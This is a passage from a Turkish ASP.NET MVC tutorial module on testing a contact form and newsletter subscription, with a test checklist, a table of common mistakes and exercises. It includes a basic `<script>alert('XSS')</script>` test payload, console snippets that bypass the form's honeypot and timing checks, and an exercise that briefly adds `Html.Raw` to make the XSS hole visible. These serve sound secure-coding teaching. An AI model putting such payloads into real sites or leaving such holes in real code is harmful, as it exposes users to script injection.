## ▶️ Test

| # | Test | Beklenen |
|---|---|---|
| 1 | `/iletisim` (giriş yapmadan) | ✅ Form açılıyor |
| 2 | Boş gönder | Alan hataları |
| 3 | Geçersiz e-posta | "Geçerli bir e-posta adresi girin" |
| 4 | 5 karakterlik mesaj | "10-2000 karakter" |
| 5 | Geçerli mesaj | Teşekkür sayfası |
| 6 | Panel → Mesajlar | Mesaj görünüyor, mavi nokta var |
| 7 | Mesajı aç | Nokta kayboldu (okundu) |
| 8 | Menüdeki rozet | Sayı azaldı |
| 9 | **Bal küpü testi** | ⬇ aşağıya bakın |
| 10 | **Hız testi** | ⬇ aşağıya bakın |
| 11 | **XSS testi** | ⬇ aşağıya bakın |
| 12 | Yan sütundan abone ol | "Teşekkürler! Kaydınız alındı." — **aynı sayfada kalıyor** |
| 13 | Yazı sayfasından abone ol | O yazının sayfasına geri dönüyor |
| 14 | Aynı e-postayı tekrar gönder | Aynı mesaj; SSMS'te tek satır |
| 15 | `ALI@Site.COM` gönder | Tabloda `ali@site.com` olarak duruyor |
| 16 | Geçersiz e-posta | "Geçerli bir e-posta adresi girin." |
| 17 | Panel → Aboneler | Liste görünüyor |
| 18 | "Çıkar" → tekrar kaydol | Hata yok, kayıt yeniden aktif oluyor |

### 9. Bal küpü testi

F12 → Console:

```javascript
document.querySelector('[name="Website"]').value = 'bot';
```

Formu doldurup gönderin. "Teşekkürler" sayfası gelir **ama panelde mesaj yoktur.** Konsolda uyarı logu görünür.

### 10. Hız testi

F12 → Console:

```javascript
document.querySelector('[name="AcilisZamani"]').value =
    Math.floor(Date.now() / 1000);
```

Hemen gönderin. Yine sahte başarı.

### 11. XSS testi

Mesaj içeriğine şunu yazıp gönderin:

```html
<script>alert('XSS')</script>
```

Panelde mesajı açın. **Uyarı kutusu ÇIKMAMALI** — metin olarak görünmeli.

> Çıkıyorsa `Html.Raw` kullanmışsınız demektir. Hemen kaldırın.

---

## ⚠️ Sık yapılan hatalar

| Hata | Sebep | Çözüm |
|---|---|---|
| `/iletisim` giriş istiyor | `GenelController` mirası yok | Ekle |
| Bal küpü görünüyor | `position:absolute` yok | CSS'i kontrol et |
| Tab ile bal küpüne düşülüyor | `tabindex="-1"` yok | Ekle |
| Ekran okuyucu bal küpünü okuyor | `aria-hidden` yok | Ekle |
| **Mesajda script çalışıyor** | `Html.Raw` kullanılmış | **Kaldır** |
| Satır sonları kayboluyor | `white-space: pre-wrap` yok | Ekle |
| Form alanları biçimsiz | `form-control` sınıfı yazılmamış | Her `input`/`textarea`'ya ekleyin |
| Rozet güncellenmiyor | Layout sorgusu önbellekli | Sayfayı yenile |
| Okunmamışlar altta | `OrderBy(m => m.OkunduMu)` yok | Ekle |
| Abonelikte her gönderim 400 veriyor | Formda `asp-action` yerine düz `action` yazılmış | Tag Helper kullanın (token otomatik gelir) |
| Abone olunca ana sayfaya atıyor | `GeriDon()` yerine sabit yönlendirme yazılmış | `Referer` + `Url.IsLocalUrl` |
| İkinci kayıtta `DbUpdateException` | `try-catch` eklenmemiş | Adım 5.1 |
| Çıkarılan abone tekrar kaydolamıyor | `IgnoreQueryFilters()` yok | Pasifleri de arayın |
| `ALI@X.COM` ile `alı@x.com` ayrı kaydediliyor | `ToLower()` kullanılmış | `ToLowerInvariant()` |
| Abonelik mesajı görünmüyor | `TempData["AboneSonuc"]` yan sütunda okunmuyor | `_YanSutun.cshtml`'i kontrol edin |

---

## ✏️ Alıştırmalar

1. İletişim formunu ve aboneliği tamamlayın, 18 test senaryosunu geçirin — özellikle 9, 10, 11 ve 18'i.

2. **XSS deneyi:** Mesaj detayında `@Model.Icerik` yerine `@Html.Raw(Model.Icerik)` yazın, script'li mesajı açın. Gördüğünüzü not edin, sonra **mutlaka geri alın.**

3. **E-posta bildirimi ekleyin:** Yeni mesaj gelince kendinize e-posta gitsin.
   İpucu: `MailKit` paketi. Gönderim başarısız olursa mesaj yine de kaydedilmeli — `try-catch` ile sarın.

4. **IP başına hız sınırı:** Aynı IP'den 5 dakikada en fazla 3 mesaj.
   İpucu: .NET 7+ `AddRateLimiter` veya `IMemoryCache` ile elle sayım.

5. **Abonelik formuna bal küpü ekleyin.** İletişim formundaki `Website` alanının aynısını yan sütundaki forma koyun. İpucu: tek parametre yerine küçük bir `AbonelikViewModel` yazmanız gerekecek.

6. **Abone sayısını panele koyun.** Modül 4'teki sayaç kartlarına yedinci bir kart ekleyin: aktif abone sayısı.

7. **Çift kayıt deneyi.** Aynı e-postayı iki kere gönderin. Aynı mesajı aldığınızı doğrulayın. Sonra SSMS'te `Aboneler` tablosuna bakın — kaç satır var?

**Düşünme soruları:**
- Bal küpüne "başarılı" dedik. Dürüst olmak gerekmez mi? Bu durumda neden farklı davranıyoruz?
- `Html.Raw`'ı yazıda kullanıp mesajda kullanmadık. Kuralı tek cümleyle nasıl ifade edersiniz?
- Zaman kontrolünü 3 saniye yaptık. 30 saniye yapsak ne olurdu? Ya 0.5 saniye?
- Abonelik formunda "zaten kayıtlısınız" demedik. Hangi bilgiyi saklıyoruz ve kimden?
- `Referer` başlığına neden güvenmiyoruz? Saldırgan onu nasıl değiştirir?

---

👉 Sonraki: [`10-gorsel-yukleme.md`](10-gorsel-yukleme.md)
